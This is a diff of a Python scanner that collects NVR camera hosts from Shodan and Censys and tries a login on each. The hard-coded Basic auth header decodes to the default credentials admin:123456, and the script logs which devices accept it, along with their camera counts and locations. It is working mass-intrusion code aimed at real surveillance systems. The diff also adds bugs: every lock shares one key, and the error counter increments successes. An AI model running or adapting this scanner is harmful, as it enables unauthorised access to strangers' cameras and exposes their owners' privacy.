@@ -5,72 +5,57 @@ import requests
 import threading
 import math
 
-SHODAN = True
-CENSYS = True
-MAX_THREADS = 50
 
 request_count = 0
 success = 0
 failed = 0
 errors = 0
 threads = 0
-
+mutex_list = {}
 
 with open('output.csv', 'w') as f:
     f.writelines("ip,port,status_code,camera count,source,city,country,country_code,longitude,latitude\n")
 
 
-thread_mutex = threading.Lock()
+def add_mutex(name):
+    if not name in mutex_list:
+        mutex_list["name"] = threading.Lock()
+
+    def decorator(function):
+        def wrapper(*args, **kwargs):
+            mutex_list["name"].acquire()
+            result = function(*args, **kwargs)
+            mutex_list["name"].release()
+            return result
+        return wrapper
+    return decorator
+
+
+@add_mutex("threads")
 def change_thread_count(change):
     global threads
-    thread_mutex.acquire()
     threads = threads + change
-    
-    if threads == 0:
-       print_stats()
 
-    thread_mutex.release()
+@add_mutex("print_single")
+def print_single(server):
+    print(f"[ \033[92m{success} \033[97m| \033[33m{failed} \033[97m| \033[91m{errors} \033[97m] http://\033[96m{server}\033[97m/")
 
-print_mutex = threading.Lock()
-def print_stats():
-    global request_count
-    print_mutex.acquire()
-
-    try:
-        request_count += 1
-        if request_count % 100 == 0:
-            print(f"scanned {request_count}, success {success}, failed {failed}, errors {errors}")
-    finally:
-        print_mutex.release()
-
-
-success_mutex = threading.Lock()
+@add_mutex("success")
 def add_success():
     global success
-    success_mutex.acquire()
-    try:
-        success += 1
-    finally:
-        success_mutex.release()
+    success += 1
 
-
-failed_mutex = threading.Lock()
+@add_mutex("failed")
 def add_failed():
     global failed
-    failed_mutex.acquire()
-    try:
-        failed += 1
-    finally:
-        failed_mutex.release()
+    failed += 1
 
-error_mutex = threading.Lock()
+@add_mutex("error")
 def add_error():
-    global errors
-    error_mutex.acquire()
-    try:
-        errors += 1
-    finally:
-        error_mutex.release()
+    global success
+    success += 1
+
+
 
 
 save_mutex = threading.Lock()
@@ -88,9 +73,6 @@ def send_login_request(server, source, city, country, country_code, long, lat):
     try:
         r = requests.get(f"http://{server}/Media/UserGroup/login?response_format=json", headers={"Authorization": "Basic YWRtaW46MTIzNDU2" }, timeout=10)
 
-        t = "\t"
-        if len(server) < 16:
-            t = t + "\t"
         if r.status_code == 200:
             add_success()
 
@@ -103,8 +85,7 @@ def send_login_request(server, source, city, country, country_code, long, lat):
             except:
                 pass
 
-
-            print(f"{server}{t}| {r.status_code}\t| {r.status_code == 200}\t| {count}")
+            print_single(server)
             save(server, r.status_code, count, source, city, country, country_code, long, lat)
         else:
             add_failed()
@@ -113,22 +94,19 @@ def send_login_request(server, source, city, country, country_code, long, lat):
         add_error()
 
     finally:
-        print_stats()
         change_thread_count(-1)
 
 
 
 def start_thread(param, source, city, country, country_code, long, lat):
-    while threads >= MAX_THREADS:
+    while threads >= config.MAX_THREADS:
         pass
 
 
     change_thread_count(1)
     threading.Thread(target=send_login_request, args=(param,source,city,country,country_code,long,lat)).start()
 
-
-print("ip\t\t\t| code\t| work \t| count")
-if SHODAN:
+if config.SHODAN:
     api = Shodan(config.SHODAN_API)
     search_term = 'http.html:NVR3.0'
    
@@ -140,9 +118,9 @@ if SHODAN:
             location = server["location"]
             start_thread(param, "SHODAN", location["city"], location["country_name"], location["country_code"], location["longitude"], location["latitude"])
 
-if CENSYS:
+if config.CENSYS:
     h = CensysHosts()
-    query = h.search("NVR3.0", per_page=100, pages=100)
+    query = h.search("NVR3.0", per_page=50, pages=5)
 
     for page in query:
         for server in page:
